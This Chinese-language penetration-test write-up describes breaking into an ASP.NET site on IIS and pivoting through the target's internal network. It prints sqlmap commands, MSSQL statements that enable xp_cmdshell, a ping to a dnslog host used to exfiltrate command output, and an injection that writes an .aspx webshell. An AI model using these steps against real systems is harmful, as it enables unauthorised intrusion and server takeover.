# 实战记录：曲线救国攻破目标站点
##### 译文声明
本文为翻译文章，仅供参考。具体内容及含义以原文为准。

## 背景介绍
本文将记录一次通过间接方法成功攻破目标站点的实战经历。

## 前期侦察
### 目标环境
- **Web服务器**：IIS7.0
- **后端技术**：ASP.NET

在初步测试中发现前台登录页面可能存在SQL注入漏洞。为了快速验证这一假设，直接使用了`sqlmap`工具进行自动化探测：
```bash
-r x.txt -v 3 --random-agent --dbms=mssql --batch
```
虽然能够识别出数据库的存在，但尝试进一步利用时遭遇了某种未知的安全机制拦截。

### 手动绕过拦截
接下来试图手工绕过该安全屏障，采用堆叠查询结合`xp_cmdshell`来执行命令并通过DNS日志获取反馈信息。
1. 开启`xp_cmdshell`功能：
   ```sql
   EXEC sp_configure 'show advanced options',1;RECONFIGURE;
   EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE
   ```
2. 利用DNS日志检测命令执行结果：
   ```sql
   EXEC master..xp_cmdshell 'ping xxx.dnslog.cn -n 2'
   ```

然而，DNS日志没有显示出任何活动迹象，这可能是因为请求被拦截、目标网络不对外通信或者命令构造错误等原因导致。鉴于此情况，决定放弃当前攻击路径。

## 曲线救国策略
既然直接针对目标站点的方法行不通，便转向考虑从其所属组织的其他子域或系统寻找突破口。计划是先渗透进入该单位内部网络，再利用如MS17-010漏洞等手段最终获取目标主机控制权。

经过一番努力，在目标IP段内成功获得了一台Linux服务器访问权限，并通过代理设置实现了对内网资源的访问。遗憾的是，所获机器上已修补了大部分常见漏洞（包括MS17-010），且fscan扫描结果也未能提供有价值的信息。此时面临的选择是继续探索内网中的其他潜在弱点，但这无疑会耗费大量时间与精力。

### 内网渗透
考虑到之前遇到的问题可能是由于外部防火墙或其他边界防御措施造成的，而一旦身处内网之中，则有可能避开这些限制。基于这一思路，再次尝试使用`sqlmap`对最初的目标站点发起攻击：
```bash
-r x.txt -v 3 --random-agent --dbms=mssql --batch
```
这次尝试取得了预期效果，成功实现了数据库管理权限（DBA）级别的注入，并通过堆叠查询+延迟注入的方式获得了操作系统命令执行能力。尽管这种方法效率较低（例如执行`whoami`命令耗时约十分钟），但仍可作为后续操作的基础。

### 获取WebShell
了解到当前用户仅拥有有限的操作权限后，决定直接向网站目录写入WebShell以便于进一步控制。由于文件系统权限限制，选择了一个允许上传文件的目录作为目标位置，并成功植入恶意脚本：
```sql
%';EXEC xp_cmdshell 'echo "xxx" > D:\xxx\xxx\xxx.aspx' -- -
```

最后一步则是利用提权工具提升至更高权限级别，从而完成了整个攻击流程。

以上就是本次“曲线救国”式渗透测试的主要过程概述。希望读者能从中获得启发并加强对自身网络安全防护意识。